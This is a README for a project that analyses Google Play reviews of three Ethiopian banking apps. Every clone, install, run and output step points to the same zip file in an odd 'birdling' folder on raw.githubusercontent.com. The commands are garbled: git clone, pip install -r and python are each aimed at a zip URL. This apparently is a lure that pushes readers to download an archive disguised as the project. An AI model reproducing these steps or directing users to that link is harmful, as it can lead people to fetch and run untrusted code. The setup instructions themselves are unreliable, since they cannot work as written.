# Customer Experience Analytics for Fintech Apps

📝 This project analyzes customer reviews and feedback from three banking applications to understand customer opinion, identify patterns, and extract valuable insights for improving user experience.

## Project folder Structure

```
.
├── data/
├── notebooks/
├── src/
├── scripts/
└── tests/
```

## Features

- Automated collection of app reviews from Google Play Store
- Support three banking apps:
  - Commercial Bank of Ethiopia (CBE)
  - Bank of Abyssinia (BOA)
  - Dashen Bank
- Data preprocessing and cleaning
- Comprehensive analysis through Jupyter notebooks
- Sentiment analysis and trend identification

## Prerequisites

- Python 3.13 or higher
- pip (Python package installer)

## Installation

1. Clone the repository:

git clone https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip

- cd Customer-Experience-Analytics-Fintech-Apps-Week2

2. Install required packages:

pip install -r https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip

## Usage

### 1. Data Collection

To collect reviews from the banking apps:

```bash
python https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip
python https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip
```

This will:

- Collect reviews from specified banking apps
- Save the data to `https://raw.githubusercontent.com/GetachewGanfur/Customer-Experience-Analytics-Fintech-Apps-Week2/main/birdling/Customer-Experience-Analytics-Fintech-Apps-Week2.zip`

### 2. Data Analysis

Open and run the Jupyter notebook for analysis:

The notebook includes:

- Data loading and exploration
- Data quality checks
- Distribution analysis
- Temporal analysis
- Review length analysis
- Summary statistics

## Data Structure

The collected data includes the following fields:

- `review`: The text content of the review
- `rating`: Numerical rating (1-5)
- `date`: Date of the review
- `bank`: Name of the banking app
- `source`: Source of the review (Google Play Store)

## Acknowledgments

- Google Play Store API for providing review data
- Python community for the excellent data analysis libraries
